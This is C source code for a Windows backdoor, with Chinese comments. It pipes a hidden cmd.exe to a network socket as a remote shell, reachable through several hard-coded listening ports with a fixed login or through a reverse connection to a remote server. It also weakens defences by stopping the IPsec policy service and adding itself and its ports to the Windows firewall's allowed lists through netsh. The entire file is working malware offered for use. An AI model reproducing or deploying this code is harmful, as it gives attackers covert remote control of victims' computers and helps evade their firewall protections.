#include "backdoor.h"

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>

#pragma comment(lib,"ws2_32.lib")

#define SOCK_BUFF_SIZE 2048

static char gl_Username[50];
static char gl_Password[50];

typedef struct
{
    SOCKET soc;
    struct sockaddr_in addr;
    void *param;
} LISTEN_THREAD_PARAM;

int conn_auth(SOCKET soc)
{
    char recvBuff[1024];
    char username[sizeof(gl_Username)];
    char password[sizeof(gl_Password)];
    int recvLen = 0;
    int totalRecvLen = 0;

    memset(username, 0x00, sizeof(username));
    memset(password, 0x00, sizeof(password));

    send(soc, "Username: ", strlen("Username: "), 0);
    while (1)
    {
        memset(recvBuff, 0x00, sizeof(recvBuff));
        recvLen = recv(soc, recvBuff, sizeof(recvBuff)-1, 0);
        totalRecvLen += recvLen;
        if (totalRecvLen >= sizeof(username))
            return 0;
        strcat(username, recvBuff);

        if (username[strlen(username) - 1] == '\n')
        {
            while (username[strlen(username) - 1] == '\n' || username[strlen(username) - 1] == '\r')
            {
                username[strlen(username) - 1] = NULL;
            }
            break;
        }
    }

    send(soc, "Password: ", strlen("Password: "), 0);
    while (1)
    {
        memset(recvBuff, 0x00, sizeof(recvBuff));
        recvLen = recv(soc, recvBuff, sizeof(recvBuff)-1, 0);
        totalRecvLen += recvLen;
        if (totalRecvLen >= sizeof(password))
            return 0;
        strcat(password, recvBuff);

        if (password[strlen(password) - 1] == '\n')
        {
            while (password[strlen(password) - 1] == '\n' || password[strlen(password) - 1] == '\r')
            {
                password[strlen(password) - 1] = NULL;
            }
            break;
        }
    }

    if (strcmp(gl_Username, username) != 0 || strcmp(gl_Password, password) != 0)
        return 0;

    return 1;
}

enum _bind_cmd_ret_
{
    BIND_CMD_NORMAL = 0,
    BIND_CMD_ERR_CREATE_PIPE,
    BIND_CMD_ERR_RECV,
    BIND_CMD_ERR_SEND,
    BIND_CMD_ERR_WR_PIPE,
    BIND_CMD_ERR_RD_PIPE,
};
int bind_cmd_proc(SOCKET soc)
{
    HANDLE hReadPipe1, hWritePipe1, hReadPipe2, hWritePipe2;       //两个匿名管道
    SECURITY_ATTRIBUTES sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    fd_set rdSet, wrSet;
    struct timeval timeoVal;
    char sendBuff[SOCK_BUFF_SIZE];
    char recvBuff[SOCK_BUFF_SIZE];
    int recvLen = 0;
    unsigned long lBytesRead = 0;

    memset(&si, NULL, sizeof(STARTUPINFO));
    memset(&sa, NULL, sizeof(SECURITY_ATTRIBUTES));
    memset(&pi, NULL, sizeof(PROCESS_INFORMATION));

    //创建两个匿名管道
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = 0;
    sa.bInheritHandle = TRUE;
    if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0))
        return BIND_CMD_ERR_CREATE_PIPE;
    if (!CreatePipe(&hReadPipe2, &hWritePipe2, &sa, 0))
        return BIND_CMD_ERR_CREATE_PIPE;

    //用管道与cmd.exe绑定
    GetStartupInfo(&si);
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hReadPipe1;
    si.hStdOutput = si.hStdError = hWritePipe2;
    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, 1, NULL, NULL, NULL, &si, &pi);

    //roll select
    while (1)
    {
        timeoVal.tv_sec = 0;
        timeoVal.tv_usec = 100;
        FD_ZERO(&rdSet);
        FD_ZERO(&wrSet);
        FD_SET(soc, &rdSet);
        memset(recvBuff, NULL, sizeof(recvBuff));
        memset(sendBuff, NULL, sizeof(sendBuff));

        if (select(-1, &rdSet, NULL, NULL, &timeoVal) > 0)
        {
            //recv from socket
            if (FD_ISSET(soc, &rdSet))
            {
                if ((recvLen = recv(soc, recvBuff, sizeof(recvBuff) - 1, 0)) <= 0)
                {
                    TerminateProcess(pi.hProcess, -1);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe1);
                    CloseHandle(hWritePipe1);
                    CloseHandle(hReadPipe2);
                    CloseHandle(hWritePipe2);
                    return BIND_CMD_ERR_RECV;
                }

                //write to pipe
                if (!WriteFile(hWritePipe1, recvBuff, strlen(recvBuff), &lBytesRead, 0))
                {
                    TerminateProcess(pi.hProcess, -1);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe1);
                    CloseHandle(hWritePipe1);
                    CloseHandle(hReadPipe2);
                    CloseHandle(hWritePipe2);
                    return BIND_CMD_ERR_WR_PIPE;
                }
            }
        }
        else
        {
            if (PeekNamedPipe(hReadPipe2, recvBuff, sizeof(recvBuff) - 1, &lBytesRead, 0, 0) && lBytesRead > 0)
            {
                //read from cmd.exe
                if (!ReadFile(hReadPipe2, recvBuff, sizeof(recvBuff) - 1, &lBytesRead, 0))
                {
                    TerminateProcess(pi.hProcess, -1);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe1);
                    CloseHandle(hWritePipe1);
                    CloseHandle(hReadPipe2);
                    CloseHandle(hWritePipe2);
                    return BIND_CMD_ERR_RD_PIPE;
                }

                if (send(soc, recvBuff, strlen(recvBuff), 0) <= 0)
                {
                    TerminateProcess(pi.hProcess, -1);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    CloseHandle(hReadPipe1);
                    CloseHandle(hWritePipe1);
                    CloseHandle(hReadPipe2);
                    CloseHandle(hWritePipe2);
                    return BIND_CMD_ERR_SEND;
                }
            }
        }
    }

    return BIND_CMD_NORMAL;
}

enum _client_conn_ret_
{
    CLI_CONN_NORMAL = 0,
    CLI_CONN_AUTH_FAILED,
};
DWORD WINAPI client_conn_thread(LPVOID Parameter)
{
    LISTEN_THREAD_PARAM *pParam = (LISTEN_THREAD_PARAM *)Parameter;

    if (conn_auth(pParam->soc) == 0)
    {
        closesocket(pParam->soc);
        free(pParam);
        return CLI_CONN_AUTH_FAILED;
    }

    bind_cmd_proc(pParam->soc);

    closesocket(pParam->soc);
    free(pParam);

    return CLI_CONN_NORMAL;
}

int new_conn_handler(SOCKET soc, struct sockaddr_in addr, void *param)
{
    HANDLE hThread;
    LISTEN_THREAD_PARAM *pThreadParam = NULL;

    pThreadParam = (LISTEN_THREAD_PARAM *)malloc(sizeof(LISTEN_THREAD_PARAM));
    if (pThreadParam == NULL)
        return 0;

    memset((char *)pThreadParam, 0x00, sizeof(LISTEN_THREAD_PARAM));
    pThreadParam->soc = soc;
    pThreadParam->addr = addr;
    pThreadParam->param = param;

    hThread = CreateThread(NULL, 0, client_conn_thread, (LPVOID)pThreadParam, 0, NULL);
    CloseHandle(hThread);

    return 0;
}

enum _listen_port_ret_
{
    LISTEN_NORMAL = 0,
    LISTEN_ERR_INIT,
    LISTEN_ERR_CREATE_SOC,
    LISTEN_ERR_BIND_ADDR,
    LISTEN_ERR_LISTEN_SOC,
};
int listen_port(unsigned short listenPort, int(*conn_handler)(SOCKET, struct sockaddr_in, void *), void *param)
{
    WSADATA wsa;
    SOCKET listenSoc;
    SOCKET clientSoc;
    struct sockaddr_in localAddr;
    struct sockaddr_in clientAddr;
    int callbackRetVal = 0;
    int addrLen = 0;

    memset((char *)&wsa, 0x00, sizeof(wsa));
    memset((char *)&localAddr, 0x00, sizeof(localAddr));

    localAddr.sin_family = AF_INET;
    localAddr.sin_addr.s_addr = INADDR_ANY;
    localAddr.sin_port = htons(listenPort);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return LISTEN_ERR_INIT;

    if ((listenSoc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        WSACleanup();
        return LISTEN_ERR_CREATE_SOC;
    }

    if (bind(listenSoc, (struct sockaddr *)&localAddr, sizeof(localAddr)) != 0)
    {
        closesocket(listenSoc);
        WSACleanup();
        return LISTEN_ERR_BIND_ADDR;
    }

    if (listen(listenSoc, SOMAXCONN) != 0)
    {
        closesocket(listenSoc);
        WSACleanup();
        return LISTEN_ERR_LISTEN_SOC;
    }

    while (callbackRetVal == 0)
    {
        memset((char *)&clientAddr, 0x00, sizeof(clientAddr));
        addrLen = sizeof(clientAddr);
        clientSoc = accept(listenSoc, (struct sockaddr *)&clientAddr, &addrLen);
        if (clientSoc == INVALID_SOCKET)
            continue;

        callbackRetVal = conn_handler(clientSoc, clientAddr, param);
    }
    closesocket(listenSoc);
    WSACleanup();

    return callbackRetVal;
}

enum _conn_back_ret_
{
    CONN_BACK_NORMAL = 0,
    CONN_BACK_ERR_INIT,
    CONN_BACK_ERR_CREATE_SOC,
    CONN_BACK_ERR_CONN,
};
int conn_back_to_server(char *servIP, unsigned short servPort)
{
    WSADATA wsa;
    int retVal;
    SOCKET soc;
    struct sockaddr_in servAddr;

    memset(&wsa, 0x00, sizeof(wsa));
    memset((char *)&servAddr, 0x00, sizeof(servAddr));

    servAddr.sin_family = AF_INET;
    servAddr.sin_addr.s_addr = inet_addr(servIP);
    servAddr.sin_port = htons(servPort);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return CONN_BACK_ERR_INIT;

    if ((soc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        WSACleanup();
        return CONN_BACK_ERR_CREATE_SOC;
    }

    if (connect(soc, (struct sockaddr *)&servAddr, sizeof(servAddr)) != 0)
    {
        closesocket(soc);
        WSACleanup();
        return CONN_BACK_ERR_CONN;
    }

    retVal = bind_cmd_proc(soc);

    closesocket(soc);
    WSACleanup();

    return retVal;
}

int start_service(char *usr, char *pwd, unsigned short listenPort)
{
    int retVal;

    memset(gl_Username, 0x00, sizeof(gl_Username));
    memset(gl_Password, 0x00, sizeof(gl_Password));

    strcat(gl_Username, usr);
    strcat(gl_Password, pwd);

    retVal = listen_port(listenPort, new_conn_handler, NULL);

    return retVal;
}

//////////////////////////////////////////////////////////////////////////////////////
int gl_Ports_Num = 7;
int gl_Listen_Ports[] = {7437, 74, 43, 37, 743, 437, 17437};
int *gl_Succ_Ports = NULL;
CRITICAL_SECTION gl_Mutex;

typedef struct _Thread_Param_
{
    char username[100];
    char password[100];
    int port;
} THREAD_PARAM;

static DWORD WINAPI listener_thread(LPVOID param)
{
    int idx = 0;
    THREAD_PARAM listenParam = *(THREAD_PARAM *)param;

    free(param);
    EnterCriticalSection(&gl_Mutex);
    for(idx = 0; idx < gl_Ports_Num; idx++)
    {
        if(gl_Succ_Ports[idx] == listenParam.port || \
                gl_Succ_Ports[idx] == 0)
        {
            gl_Succ_Ports[idx] = listenParam.port;
            break;
        }
    }
    LeaveCriticalSection(&gl_Mutex);

    //监听端口
    start_service(listenParam.username, listenParam.password, listenParam.port);

    EnterCriticalSection(&gl_Mutex);
    for(idx = 0; idx < gl_Ports_Num; idx++)
    {
        if(gl_Succ_Ports[idx] == listenParam.port)
        {
            gl_Succ_Ports[idx] = 0;
        }
    }
    LeaveCriticalSection(&gl_Mutex);

    return 0;
}

static int _exec_cmd(char *pCmd)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char cmd[2048];

    memset(&si, 0x00, sizeof(si));
    memset(&pi, 0x00, sizeof(pi));
    memset(cmd, 0x00, sizeof(cmd));

    sprintf(cmd, "cmd.exe /c %s", pCmd);

    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    if(CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) != 0)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        return -1;
    }

    return 0;
}

int start_listen_backdoor(int closeFirewall)
{
    HANDLE hThread = NULL;
    int idx = 0;
    int idx2 = 0;
    THREAD_PARAM *pThreadParam = NULL;
    char selfFullPath[MAX_PATH];
    char cmd[1024];
    int listenSucc = 0;

    memset(selfFullPath, 0x00, sizeof(selfFullPath));
    memset(&gl_Mutex, 0x00, sizeof(gl_Mutex));

    gl_Succ_Ports = (int *)malloc(sizeof(int) * gl_Ports_Num);
    if(gl_Succ_Ports == NULL)
        return -1;
    memset(gl_Succ_Ports, 0x00, sizeof(int) * gl_Ports_Num);

    InitializeCriticalSection(&gl_Mutex);

    if(closeFirewall != 0)
    {
        //关闭IP策略
        memset(cmd, 0x00, sizeof(cmd));
        strcat(cmd, "sc stop policyagent");
        _exec_cmd(cmd);

        memset(cmd, 0x00, sizeof(cmd));
        if(GetModuleFileName(NULL, selfFullPath, sizeof(selfFullPath) - 1) != 0)
        {
            //添加进程放行名单
            sprintf(cmd, "netsh firewall set allowedprogram \"%s\" A ENABLE", selfFullPath);
            _exec_cmd(cmd);
        }

        for(idx = 0; idx < gl_Ports_Num; ++idx)
        {
            //添加端口放行名单
            memset(cmd, 0x00, sizeof(cmd));
            sprintf(cmd, "netsh firewall set portopening TCP %d ENABLE", gl_Listen_Ports[idx]);
            _exec_cmd(cmd);
        }

        /*
        //禁用Windows防火墙，会触发防火墙策略
        memset(cmd, 0x00, sizeof(cmd));
        strcat(cmd, "netsh firewall set opmode mode=disable");
        _exec_cmd(cmd);
        */
    }

    while(1)
    {
        for(idx = 0; idx < gl_Ports_Num; idx++)
        {
            listenSucc = 0;
            for(idx2 = 0; idx2 < gl_Ports_Num; idx2++)
            {
                EnterCriticalSection(&gl_Mutex);
                if(gl_Listen_Ports[idx] == gl_Succ_Ports[idx2])
                {
                    //此端口已成功监听
                    listenSucc = 1;
                    LeaveCriticalSection(&gl_Mutex);
                    break;
                }
                LeaveCriticalSection(&gl_Mutex);
            }
            if(listenSucc == 0)
            {
                //当前端口未监听,启动端口监听
                pThreadParam = (THREAD_PARAM *)malloc(sizeof(THREAD_PARAM));
                if(pThreadParam == NULL)
                    continue;
                memset(pThreadParam, 0x00, sizeof(THREAD_PARAM));
                strcat(pThreadParam->username, USERNAME);
                strcat(pThreadParam->password, PASSWORD);
                pThreadParam->port = gl_Listen_Ports[idx];

                hThread = CreateThread(NULL, 0, listener_thread, (LPVOID)pThreadParam, 0, NULL);
                if(hThread == NULL)
                {
                    free(pThreadParam);
                }
                else
                {
                    CloseHandle(hThread);
                }
            }
        }
        Sleep(3000);
    }

    return 0;
}
